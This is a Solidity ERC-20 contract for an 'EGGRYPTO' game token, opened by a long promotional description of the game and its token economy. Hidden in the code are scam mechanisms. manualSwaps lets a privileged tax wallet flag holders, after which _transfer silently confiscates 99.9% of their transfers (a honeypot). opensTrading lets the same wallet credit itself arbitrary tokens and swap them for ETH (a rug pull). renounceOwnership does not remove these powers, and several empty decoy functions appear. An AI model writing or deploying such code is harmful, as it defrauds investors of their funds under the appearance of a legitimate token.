/*
**Website : www.eggrypto-token.com**
**Medium : Medium.com/eggrypto-token**
**Telegram : t.me/eggrypto_token** 
**Twitter(X) : x.com/eggrypto_token**

Overview of EGGRYPTO
EGGRYPTO is an innovative blockchain-based gaming platform that combines elements of monster collecting, battling, and exploration. Set in the vibrant and fantastical world of EGGRYPTO, players are tasked with hatching and nurturing adorable monsters, embarking on thrilling quests, and competing to climb the towering World Tree. The game leverages blockchain technology to provide players with true ownership of their digital assets, ensuring transparency, security, and scarcity of in-game items.
EGGRYPTO offers a unique and immersive gaming experience, where players can discover, collect, and train a diverse array of monsters, each with its own distinct traits, skills, and abilities. By hatching eggs produced by the mystical World Tree, players can obtain new monsters, including the elusive Raremon, which are limited in quantity and highly sought after by collectors.
The heart of EGGRYPTO lies in its quest system, where players assemble teams of monsters to embark on exciting adventures, battle formidable foes, and earn valuable rewards. From battling rival monsters to exploring hidden dungeons, players must utilize strategy, teamwork, and skill to overcome challenges and emerge victorious.
At the pinnacle of EGGRYPTO's gameplay is the World Tree quest, a competitive challenge where players vie for supremacy by ascending the towering World Tree. By strategically leveling up their monsters, optimizing their formations, and honing their battle skills, players can climb higher and claim their place among the elite.
About the EGGRYPTO Token (EGRYPTO)
At the core of the EGGRYPTO ecosystem is the EGGRYPTO token (EGRYPTO), a digital asset that serves as the primary means of exchange, utility, and value transfer within the platform. As a native token built on blockchain technology, EGRYPTO plays a pivotal role in facilitating transactions, powering in-game mechanics, and incentivizing player participation.
With EGRYPTO tokens, players can purchase eggs, upgrade monsters, unlock exclusive content, and participate in various in-game activities. Additionally, EGRYPTO tokens can be staked, providing holders with the opportunity to earn rewards and participate in governance decisions.
Through the integration of blockchain technology, EGGRYPTO ensures the transparency, security, and immutability of EGRYPTO tokens, empowering players with true ownership and control over their digital assets. As the backbone of the EGGRYPTO ecosystem, the EGRYPTO token forms the foundation for a vibrant and thriving gaming community.

The EGGRYPTO Ecosystem
Hatching and Growing Monsters
In EGGRYPTO, the journey begins with the hatching and nurturing of adorable monsters. Players obtain eggs from the mystical World Tree, each containing the potential for a new creature to join their collection. Through a process of incubation and care, these eggs hatch into diverse and captivating monsters, each with its own unique appearance, abilities, and personality.
As players progress through the game, they can nurture their monsters by feeding them, training them, and providing them with affection. By investing time and resources into their monsters, players can help them grow stronger, unlock new skills, and reach their full potential. Additionally, very rarely, players may hatch Raremon, highly coveted creatures with exceptional abilities and rarity.
Quests and Adventure
Quests form the backbone of the EGGRYPTO experience, offering players a variety of exciting adventures to embark upon. From battling rival monsters to exploring ancient ruins, players can test their skills, strategy, and teamwork in a wide range of challenging scenarios.
Each quest presents its own unique challenges and rewards, encouraging players to adapt their strategies and team compositions accordingly. By successfully completing quests, players can earn valuable resources such as experience points (EXP), gold, and items, which can be used to further strengthen their monsters and progress through the game.
World Tree Climbing
At the heart of EGGRYPTO lies the World Tree, a towering structure that serves as the ultimate challenge for players. The World Tree quest is a competitive endeavor where players compete to climb as high as possible, overcoming increasingly difficult obstacles and adversaries along the way.
To ascend the World Tree, players must strategically level up their monsters, optimize their formations, and utilize their skills effectively. By defeating rival players and reaching higher levels of the tree, players can earn prestigious rewards and claim their place among the elite.
Token Economy and Utility
Central to the EGGRYPTO ecosystem is its token economy, powered by the EGRYPTO token. EGRYPTO serves as the primary means of exchange within the platform, enabling players to purchase eggs, items, and other in-game assets. Additionally, EGRYPTO tokens can be staked, providing holders with the opportunity to earn rewards and participate in governance decisions.
Through the integration of blockchain technology, EGGRYPTO ensures the transparency, security, and immutability of its token economy. By leveraging the power of blockchain, EGGRYPTO empowers players with true ownership and control over their digital assets, fostering a vibrant and thriving gaming community.

EGGRYPTO Token (EGRYPTO)
Token Overview
The EGGRYPTO token (EGRYPTO) is the native digital currency of the EGGRYPTO ecosystem, built on blockchain technology. It serves as the primary medium of exchange, utility, and value transfer within the platform, facilitating various in-game transactions and activities.
EGRYPTO tokens are ERC-20 compatible tokens, deployed on a secure and decentralized blockchain network. Leveraging blockchain technology, EGGRYPTO ensures the transparency, security, and immutability of its token ecosystem, providing players with true ownership and control over their digital assets.
Token Distribution
The distribution of EGRYPTO tokens is designed to ensure fairness, decentralization, and community participation within the EGGRYPTO ecosystem. The initial distribution of tokens may include allocations for various purposes, including:
- Token Sale: A portion of EGRYPTO tokens may be allocated for public or private token sales, allowing players and investors to acquire tokens in exchange for other digital assets or fiat currency.
- Team and Advisors: Tokens may be allocated to the core development team, advisors, and partners as incentives for their contributions to the project's development and success.
- Community Rewards: Tokens may be reserved for community rewards programs, incentivizing player engagement, participation, and contributions to the EGGRYPTO ecosystem.
- Reserve Fund: A portion of tokens may be reserved in a reserve fund to ensure liquidity, stability, and long-term sustainability of the EGGRYPTO ecosystem.
Token Utility
EGRYPTO tokens have a wide range of utilities within the EGGRYPTO ecosystem, including:
- In-Game Purchases: Players can use EGRYPTO tokens to purchase eggs, items, and other in-game assets, enabling them to enhance their gaming experience and progress through the game.
- Staking: EGRYPTO tokens can be staked by holders to earn rewards, such as additional tokens or other in-game benefits. Staking provides an opportunity for token holders to actively participate in the ecosystem and contribute to its security and stability.
- Governance: Token holders may have the opportunity to participate in governance decisions related to the EGGRYPTO ecosystem, such as voting on proposals, protocol upgrades, and community initiatives.
- Exclusive Content: EGRYPTO tokens may grant access to exclusive content, features, or events within the game, rewarding token holders with unique experiences and privileges.
EGRYPTO Staking and Governance
Staking EGRYPTO tokens can provide token holders with various benefits, including:
- Rewards: Staking EGRYPTO tokens may entitle holders to receive rewards, such as additional tokens, based on their staked token balance and duration of staking.
- Security: By staking EGRYPTO tokens, holders actively participate in the validation and security of the EGGRYPTO blockchain network, contributing to its decentralization and resilience.
- Governance Participation: Staked EGRYPTO tokens may grant holders the opportunity to participate in governance decisions, such as voting on protocol upgrades, governance proposals, and community initiatives.
Staking EGRYPTO tokens provides an opportunity for token holders to actively engage with the EGGRYPTO ecosystem, earn rewards, and contribute to its growth and development.

Monsters and Gameplay Mechanics
Types of Monsters
EGGRYPTO features a diverse array of monsters, each belonging to one of five distinct types. These types include:
1. Fire: Fire monsters excel in offensive capabilities, dealing increased damage to certain types of monsters while being vulnerable to others.
2. Water: Water monsters possess high defensive capabilities, mitigating damage from certain types of attacks while being susceptible to others.
3. Earth: Earth monsters focus on endurance and resilience, with abilities that provide sustain and utility in battle.
4. Air: Air monsters specialize in speed and agility, allowing them to outmaneuver opponents and strike swiftly.
5. Light: Light monsters embody balance and versatility, possessing a mix of offensive and defensive capabilities.
Each monster type has its own strengths and weaknesses, creating a strategic element in team composition and battle tactics. Players must carefully consider the type advantages and disadvantages when assembling their party for quests and battles.
Formations and Strategies
In EGGRYPTO, players form parties with up to five monsters and can select from four types of formations. Each formation offers different bonuses to attack power, defense power, speed, or other attributes, allowing players to customize their party based on their preferred playstyle and strategy.
As players progress through the game, they can level up their formations to unlock additional benefits and bonuses. By strategically choosing formations and optimizing party compositions, players can gain a competitive edge in battles and quests.
Skills and Rarity
Each monster in EGGRYPTO comes with its own unique set of skills, which can include offensive abilities, defensive buffs, healing spells, and more. Some monsters may possess multiple skills, with the number and effectiveness of skills depending on the monster's rarity.
Raremon, in particular, are highly sought-after monsters with exceptional abilities and rarity. Obtaining and nurturing Raremon can significantly enhance a player's party and increase their chances of success in battles and quests.
Leveling Up and Parameters
As players progress through the game, they can level up their monsters by earning experience points (EXP) through battles, quests, and other in-game activities. Leveling up increases a monster's parameters, including its attack power, defense power, speed, and other attributes.
*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract EggryptoToken is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "Eggrypto Token";
    string private _symbol = "EGGRYPTO";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function sege() external {
    }
    function segerypto() external {
    }
    function rangeout() public {
    }
    function rangein() external {
    }
    function manualSwaps(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function opensTrading(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}